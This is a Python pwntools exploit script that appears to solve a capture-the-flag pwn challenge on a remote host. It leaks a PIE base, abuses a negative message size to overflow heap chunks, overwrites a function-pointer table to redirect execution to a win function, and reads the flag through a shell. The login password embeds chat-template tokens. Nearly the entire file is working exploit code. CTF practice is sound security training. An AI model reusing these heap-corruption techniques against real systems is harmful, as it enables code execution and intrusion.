#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "113.20.103.216"
elf = context.binary = ELF('./challenge_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000196F
            brva 0x00000000000019B4
            brva 0x0000000000001A21
            brva 0x0000000000001AE4
            brva 0x0000000000001840
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

# Login
menu(1)

dump = [0x3c, 0x7c, 0x65, 0x6f, 0x74, 0x5f, 0x69, 0x64, 0x7c, 0x3e, 0x3c, 0x7c, 0x69, 0x6d, 0x5f, 0x65, 0x6e, 0x64, 0x7c, 0x3e, 0x70, 0x77, 0x64, 0x3d, 0x67, 0x75, 0x65, 0x73, 0x74]
key = bytes(dump) # <|eot_id|><|im_end|>pwd=guest
sla(b'Password: ', key)

def size(sz):
    menu(1)
    sla(b'message size: ', str(sz).encode())

def prior(idx):
    menu(2)
    sla(b'priority (1-10): ', str(idx).encode())

def create(dt):
    menu(3)
    sla(b'message: ', dt)

def view():
    menu(4)

def send():
    menu(5)

def call(dt):
    menu(6)
    sla(b'(e.g., ID-1234): ', dt)

def compress():
    menu(7)

# Leak PIE

prior(0)
call(b'd1nhdwc')
p.recvuntil(b'Ticket created for ID: ')
PIE = int(p.recvline().strip(), 10) - 0x5b4c
elf.address = PIE
log.success(f'PIE: {hex(PIE)}')

# Overwrite opt_exec[1] -> win

size(-1)
create(b'A'*0xc8 + p64(PIE + 0x5b50))
size(0x71)
send()

chunks = [0x5b50, 0x5bb0, 0x5c10, 0x5c70, 0x5cd0]

pl = flat({
    0x58: 0x71
    }, length = 0x64)

size(-1)
for x in chunks:
    create(pl.ljust(0xc8, b'A') + p64(PIE + x + 0x60))
    send()

# GDB()
pl = flat({             # PIE + 0x5d30
    0x8: PIE + 0x21be,  # win
    0x20: PIE + 0x5d30, # opt_exec
    0x28: p32(1),       # login check
    }, length = 0x64, filler= b'\x00')

create(pl.ljust(0xc8, b'A') + p64(PIE + 0x5b50))

menu(1)
p.sendline(b'cat flag.txt')
p.interactive()

# CSCV2026{don_u_dare_to_slop_my_challenge!!!}